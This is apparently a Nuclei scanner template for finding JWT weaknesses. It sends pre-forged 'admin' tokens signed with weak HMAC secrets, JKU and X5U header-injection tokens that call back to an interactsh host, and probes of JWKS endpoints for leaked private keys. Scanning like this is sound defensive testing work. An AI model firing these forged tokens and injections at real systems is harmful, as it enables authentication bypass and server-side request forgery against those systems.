id: jwt-weak-secret-hs256-detection

info:
  name: JWT Weak HMAC Secret Detection
  author: achraf-chehboun
  severity: critical
  description: |
    Detects JWT tokens signed with known weak/default HMAC secrets. Uses baseline
    rejection check — endpoint must return 401/403 for invalid tokens before testing
    weak-secret tokens. Also detects JKU/X5U header injection via interactsh and
    exposed JWKS endpoints leaking private key material.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-521
  metadata:
    max-request: 10
  tags: jwt,weak-secret,hmac,jku,jwk,detection-only

variables:
  jwt_secret: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ.JMKKnFMHC6A8o0vevqJDwbCBGapG0VY3PjhOhMMGMJE"
  jwt_password: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ.QY25-lX_EwK6HVCkMjKLyBh7b-g9cW3eo3SALLmFiSM"
  jwt_key: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ.VVbVf8lxB8yjvgVoYK7uuOdFi_LLsOX-HEX4n-kzl9I"

http:
  # Weak secret test: baseline rejection, then weak-secret tokens
  - raw:
      - |
        GET {{BaseURL}}/api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer invalid.garbage.xnlbz
        Accept: application/json
      - |
        GET {{BaseURL}}/api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_secret}}
        Accept: application/json
      - |
        GET {{BaseURL}}/api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_password}}
        Accept: application/json
      - |
        GET {{BaseURL}}/api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_key}}
        Accept: application/json

    req-condition: true
    matchers-condition: or
    matchers:
      - type: dsl
        name: weak-secret-accepted
        dsl:
          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_2 == 200 && contains(content_type_2, "json") && !contains(body_2, "<html")'
          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_3 == 200 && contains(content_type_3, "json") && !contains(body_3, "<html")'
          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_4 == 200 && contains(content_type_4, "json") && !contains(body_4, "<html")'
        condition: or

  # JKU header injection — server fetches attacker-controlled key
  - raw:
      - |
        GET {{BaseURL}}/api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly97e2ludGVyYWN0c2gtdXJsfX0vLndlbGwta25vd24vandrcy5qc29uIn0.eyJzdWIiOiIxIn0.
        Accept: application/json

    matchers:
      - type: word
        part: interactsh_protocol
        name: jku-header-ssrf
        words:
          - "http"
          - "dns"
        condition: or

  # X5U header injection
  - raw:
      - |
        GET {{BaseURL}}/api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly97e2ludGVyYWN0c2gtdXJsfX0vY2VydC5wZW0ifQ.eyJzdWIiOiIxIn0.
        Accept: application/json

    matchers:
      - type: word
        part: interactsh_protocol
        name: x5u-header-ssrf
        words:
          - "http"
          - "dns"
        condition: or

  # JWKS endpoint — private key leak (critical) vs public-only (info)
  - method: GET
    path:
      - "{{BaseURL}}/.well-known/jwks.json"
      - "{{BaseURL}}/oauth2/jwks"
      - "{{BaseURL}}/auth/realms/master/protocol/openid-connect/certs"

    stop-at-first-match: false
    matchers-condition: or
    matchers:
      - type: dsl
        name: jwks-private-key-leak
        dsl:
          - 'status_code == 200 && contains(content_type, "json") && contains(body, "\"d\"") && contains(body, "\"kty\"")'

      - type: dsl
        name: jwks-symmetric-key-leak
        dsl:
          - 'status_code == 200 && contains(content_type, "json") && contains(body, "\"kty\":\"oct\"") && contains(body, "\"k\"")'

    extractors:
      - type: regex
        name: key-details
        group: 0
        regex:
          - '"kty"\s*:\s*"([^"]+)"'
          - '"alg"\s*:\s*"([^"]+)"'
          - '"kid"\s*:\s*"([^"]+)"'
